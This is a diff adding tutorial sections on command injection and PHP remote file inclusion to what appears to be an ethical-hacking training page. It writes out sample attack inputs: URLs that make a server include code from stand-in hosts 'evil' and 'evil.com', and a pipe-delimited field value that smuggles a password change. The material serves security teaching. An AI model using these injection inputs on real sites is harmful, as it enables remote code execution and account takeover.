@@ -161,3 +161,25 @@ form fields, queries, searches and so on. It allows:</p>
  <ul>Modify database contents or drop the database altogether</ul>
  <ul>Use the trust relationships established between the web application components to access other databases</ul>
 </ol></p>
+<h2>Command Injection Attacks</h2>
+<p>Command Injection flaws allow attackers to pass malicious code to different systems via web applications. The attacks include calls to an operating system over system calls, use of external programs over 
+shell commands and calls to backend databases over SQL. Scripts in Perl, Python and other languages execute and insert poorly designed web applications. If a web application uses any type of interpreter, 
+attackers insert malicious code to inflict damage.</p>
+<p>A frequently used program is <b>sendmail</b>. Carefully scrub an application before passing a piece of information through an HTTP external request. Otherwise, attackers can insert special characters, 
+malicious commands and command modifiers into the information. The web application then blindly passes these characters to the external system for execution. Inserting SQL commands is a dangerous practice 
+and rather widespread, as it is a command injection method. </p>
+<p><ol>
+ <ul>Shell Injection -> include system(), StartProcess(), java.lang.Runtime.exec(), System.Diagnostics.Process.Start() and similar APIs</ul>
+ <ul>HTML Embedding -> extra HTML - based content is added; script is placed into output HTML</ul>
+ <ul>File Injection -> http://www.certifiedhacker.com/vulnerable.php?COLOR=http://evil/exploit?</ul>
+</ol></p>
+<p>Example: an attacker enters the following malicious code (account number) with a new password:</p>
+<p>www.certifiedhacker.com/banner.gif||newpassword||1036|60|468</p>
+<p>The last two sets of numbers denote the banner size. Once the attacker clicks the submit button, the password for the account 1036 is changed to 'newpassword'. The server script assumes that only the 
+URL of the banner image file is inserted into that field.</p>
+<h2>File Injection Attack</h2>
+<p>A file injection attack is a technique used to exploit "dynamic file include" mechanisms in web applications. File injection attacks enable attackers to exploit vulnerable scripts on the server to use 
+a remote file instead of a presumably trusted file from the local file system. Most web application frameworks support file inclusion. An attacker enters a URL that redirects the application to the location 
+of the malicious file. PHP is particularly vulnerable to these attacks because of the extensive use of "file includes" in PHP programming and default server configurations. </p>
+<p>If the application ends with a php extension, and if a user requests it, then the application interprets it as a PHP script and executes it. This allows an attacker to perform arbitrary commands:</p>
+<p>http://www.certifiedhacker.com/orders.php?DRINK=http://evil.com/exploit?</p>
